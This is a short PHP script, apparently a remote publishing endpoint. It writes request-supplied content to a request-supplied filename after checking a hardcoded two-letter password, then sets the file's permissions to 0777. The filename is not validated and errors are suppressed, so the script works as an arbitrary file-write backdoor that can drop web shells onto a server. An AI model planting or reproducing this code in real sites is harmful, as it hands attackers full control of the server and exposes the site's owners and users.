<?php
error_reporting(E_ERROR);
//set_time_limit(0);
//header("Content-Type: text/html; charset=utf-8");
$system_password="yt";
$action=$_REQUEST['action'];
$password=$_REQUEST['password'];
$filename=$_REQUEST['filename'];
$body=stripslashes($_REQUEST['body']);

if($password!=$system_password)
{
    echo 'password error';
    return;
}

if($action=="test")
{
    echo 'test success';
    return;
}

$wjj=dirname(__FILE__);
if(!file_exists($wjj))
{
   mkdir($wjj,0777);
}

$fp=fopen($filename,"w");
//fwrite($fp,"\xEF\xBB\xBF".iconv('gbk','utf-8//IGNORE',$body));
fwrite($fp,"\xEF\xBB\xBF".$body);
fclose($fp);

if(file_exists($filename))
{
  chmod($filename,0777);
}
echo "publish success";
?>
